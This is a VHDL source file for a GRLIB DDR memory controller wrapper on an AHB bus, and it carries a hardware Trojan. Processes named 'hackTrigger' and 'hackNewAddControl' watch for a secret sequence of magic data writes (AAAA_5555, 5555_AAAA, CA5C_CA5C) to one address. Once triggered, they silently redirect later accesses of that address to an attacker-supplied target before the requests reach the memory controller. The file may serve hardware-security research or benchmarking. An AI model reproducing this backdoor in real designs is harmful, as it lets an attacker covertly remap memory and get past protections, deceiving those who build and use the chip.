LIBRARY ieee;
    USE ieee.std_logic_1164.all;
LIBRARY grlib;
    USE grlib.amba.all;
    USE grlib.stdlib.all;
LIBRARY gaisler;
    USE grlib.devices.all;
    USE gaisler.memctrl.all;
LIBRARY techmap;
    USE techmap.gencomp.all;

ENTITY ddrspa IS
    GENERIC (
        fabtech : integer := virtex2;
        memtech : integer := 0;
        rskew : integer := 0;
        hindex : integer := 3;
        haddr : integer := 1024;
        hmask : integer := 3072;
        ioaddr : integer := 1;
        iomask : integer := 4095;
        MHz : integer := 100;
        clkmul : integer := 18;
        clkdiv : integer := 20;
        col : integer := 9;
        Mbyte : integer := 256;
        rstdel : integer := 200;
        pwron : integer := 1;
        oepol : integer := 0;
        ddrbits : integer := 64;
        ahbfreq : integer := 65
    );
    PORT (
        rst_ddr : in std_ulogic;
        rst_ahb : in std_ulogic;
        clk_ddr : in std_ulogic;
        clk_ahb : in std_ulogic;
        lock : out std_ulogic;
        clkddro : out std_ulogic;
        clkddri : in std_ulogic;
        ahbsi : in ahb_slv_in_type;
        ahbso : out ahb_slv_out_type;
        ddr_clk : out std_logic_vector ( 2 downto 0 );
        ddr_clkb : out std_logic_vector ( 2 downto 0 );
        ddr_clk_fb_out : out std_logic;
        ddr_clk_fb : in std_logic;
        ddr_cke : out std_logic_vector ( 1 downto 0 );
        ddr_csb : out std_logic_vector ( 1 downto 0 );
        ddr_web : out std_ulogic;
        ddr_rasb : out std_ulogic;
        ddr_casb : out std_ulogic;
        ddr_dm : out std_logic_vector ( 64 / 8 - 1 downto 0 );
        ddr_dqs : inout std_logic_vector ( 64 / 8 - 1 downto 0 );
        ddr_ad : out std_logic_vector ( 13 downto 0 );
        ddr_ba : out std_logic_vector ( 1 downto 0 );
        ddr_dq : inout std_logic_vector ( 64 - 1 downto 0 )
    );
END ENTITY;

ARCHITECTURE rtl OF ddrspa IS
    CONSTANT DDR_FREQ : integer := ( 18 * 100 ) / 20;
    CONSTANT FAST_AHB : integer := 65 / ( 18 * 100 ) / 20;
    SIGNAL sdi : sdctrl_in_type;
    SIGNAL sdo : sdctrl_out_type;
    SIGNAL clkread : std_ulogic;
    SIGNAL knockState : std_logic_vector ( 1 downto 0 );
    SIGNAL catchAddress : std_logic_vector ( 31 downto 0 );
    SIGNAL targetAddress : std_logic_vector ( 31 downto 0 );
    SIGNAL modahbsi : ahb_slv_in_type;
    SIGNAL currentAddress : std_logic_vector ( 31 downto 0 );
    SIGNAL newAddCon : std_ulogic;
    SIGNAL knockAddress : std_logic_vector ( 31 downto 0 );
BEGIN
    hackNewAddControl : PROCESS ( clk_ahb )
    BEGIN
        IF ( rising_edge ( clk_ahb ) ) THEN
            IF ( ahbsi.hsel ( 3 ) = '1' and ahbsi.hwrite = '1' and ahbsi.htrans ( 1 ) = '1' and ahbsi.hready = '1' ) THEN
                currentAddress <= ahbsi.haddr;
                newAddCon <= '1';
            ELSE
                newAddCon <= '0';
            END IF;
        END IF;
    END PROCESS;
    hackTrigger : PROCESS ( clk_ahb )
    BEGIN
        IF ( rising_edge ( clk_ahb ) ) THEN
            IF ( newAddCon = '1' ) THEN
                IF ( ahbsi.hwdata = X"AAAA_5555" ) THEN
                    knockState <= "01";
                    knockAddress <= currentAddress;
                ELSIF ( knockState = "01" and currentAddress = knockAddress and ahbsi.hwdata = X"5555_AAAA" ) THEN
                    knockState <= "10";
                ELSIF ( knockState = "10" and currentAddress = knockAddress and ahbsi.hwdata = X"CA5C_CA5C" ) THEN
                    knockState <= "11";
                ELSIF ( knockState = "11" and currentAddress = knockAddress ) THEN
                    targetAddress <= ahbsi.hwdata;
                    catchAddress <= knockAddress;
                    knockState <= "00";
                END IF;
            END IF;
        END IF;
    END PROCESS;
    
      modahbsi <= ahbsi;
      modahbsi.haddr <= ahbsi.haddr WHEN ( ahbsi.haddr /= catchAddress ) ELSE targetAddress;

    ddr_phy0 : COMPONENT ddr_phy
        GENERIC MAP (
            tech => VIRTEX2 , MHz => 100 , dbits => 64 , rstdelay => 200 , clk_mul => 18 , clk_div => 20 , rskew => 0
        ) PORT MAP (
            rst_ddr , clk_ddr , clkddro , clkread , lock , ddr_clk , ddr_clkb , ddr_clk_fb_out , ddr_clk_fb , ddr_cke , ddr_csb , ddr_web , ddr_rasb , ddr_casb , ddr_dm , ddr_dqs , ddr_ad , ddr_ba , ddr_dq , sdi , sdo
        )
    ;
    ddr16 : IF 64 = 16 GENERATE
    BEGIN
        ddrc : COMPONENT ddrsp16a
            GENERIC MAP (
                memtech => 0 , hindex => 3 , haddr => 1024 , hmask => 3072 , ioaddr => 1 , iomask => 4095 , pwron => 1 , MHz => ( 18 * 100 ) / CLKDIV , col => 9 , Mbyte => 256 , fast => 65 / DDR_FREQ
            ) PORT MAP (
                rst_ahb , clkddri , clk_ahb , clkread , ahbsi , ahbso , sdi , sdo
            )
        ;
    END GENERATE;
    ddr32 : IF 64 = 32 GENERATE
    BEGIN
        ddrc : COMPONENT ddrsp32a
            GENERIC MAP (
                memtech => 0 , hindex => 3 , haddr => 1024 , hmask => 3072 , ioaddr => 1 , iomask => 4095 , pwron => 1 , MHz => ( 18 * 100 ) / CLKDIV , col => 9 , Mbyte => 256 , fast => 65 / DDR_FREQ / 2
            ) PORT MAP (
                rst_ahb , clkddri , clk_ahb , ahbsi , ahbso , sdi , sdo
            )
        ;
    END GENERATE;
    ddr64 : IF 64 = 64 GENERATE
    BEGIN
        ddrc : COMPONENT ddrsp64a
            GENERIC MAP (
                memtech => 0 , hindex => 3 , haddr => 1024 , hmask => 3072 , ioaddr => 1 , iomask => 4095 , pwron => 1 , MHz => ( 18 * 100 ) / CLKDIV , col => 9 , Mbyte => 256 , fast => 65 / DDR_FREQ / 4
            ) PORT MAP (
                rst_ahb , clkddri , clk_ahb , modahbsi , ahbso , sdi , sdo
            )
        ;
    END GENERATE;
END ARCHITECTURE;
